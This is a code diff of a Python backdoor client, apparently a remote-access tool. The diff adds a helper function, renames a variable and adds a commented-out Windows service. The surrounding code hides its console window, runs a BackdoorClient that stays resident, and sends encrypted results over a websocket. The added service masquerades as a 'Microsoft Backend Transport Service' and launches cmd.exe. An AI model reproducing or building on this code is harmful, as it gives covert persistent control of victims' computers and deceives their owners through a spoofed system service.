@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import os
+import sys
 import chardet
 import ctypes
 import subprocess
@@ -12,6 +13,10 @@ import urllib
 from base64 import b64decode, b64encode
 from websocket import create_connection
 from Crypto.Cipher import AES
+
+# import win32service
+# import win32serviceutil
+# import win32event
 __author__ = 'nekocode'
 
 
@@ -139,9 +144,48 @@ class ShowDialog(threading.Thread):
         self.start()
 
     def run(self):
+        # win32api.MessageBox(0, self.content, self.title)
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
         self.msg['rlt'] = 'Show dialog OK.'
         self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
+
+
+# class BackendDaemonSrv(win32serviceutil.ServiceFramework):
+#     _svc_name_ = 'TransSrv'
+#     _svc_display_name_ = 'Microsoft Backend Transport Service'
+#     _svc_description_ = 'Enables you to access your pc anytime, anywhere.'
+#
+#     def __init__(self, args):
+#         win32serviceutil.ServiceFramework.__init__(self, args)
+#         self.stop_event = win32event.CreateEvent(None, 0, 0, None)
+#
+#     def SvcDoRun(self):
+#         self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
+#         try:
+#             self.ReportServiceStatus(win32service.SERVICE_RUNNING)
+#             self.start()
+#             win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
+#         except Exception, x:
+#             self.SvcStop()
+#
+#     def SvcStop(self):
+#         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+#         win32event.SetEvent(self.stop_event)
+#         self.ReportServiceStatus(win32service.SERVICE_STOPPED)
+#
+#     def start(self):
+#         self.runflag = True
+#         os.popen('cmd.exe')
+#
+#     def my_stop(self):
+#         self.runflag = False
+
+
+def module_path():
+    encoding = sys.getfilesystemencoding()
+    if hasattr(sys, 'frozen'):
+        return os.path.dirname(unicode(sys.executable, encoding))
+    return os.path.dirname(unicode(__file__, encoding))
 
 
 def decode2utf(rawstr):
@@ -152,11 +196,11 @@ def decode2utf(rawstr):
 
 
 def hostname():
-    sys = os.name
+    sys_name = os.name
 
-    if sys == 'nt':
+    if sys_name == 'nt':
         return os.getenv('computername')
-    elif sys == 'posix':
+    elif sys_name == 'posix':
         host = os.popen('echo $HOSTNAME')
         try:
             name = host.read()
@@ -173,10 +217,13 @@ def hide_cmd_window():
         ctypes.windll.user32.ShowWindow(whnd, 0)
         ctypes.windll.kernel32.CloseHandle(whnd)
 
+
 if __name__ == '__main__':
+    # if len(sys.argv) == 1:
     hide_cmd_window()
     BackdoorClient()
     while True:
         time.sleep(10)
-
+    # else:
+    #     win32serviceutil.HandleCommandLine(BackendDaemonSrv)
 
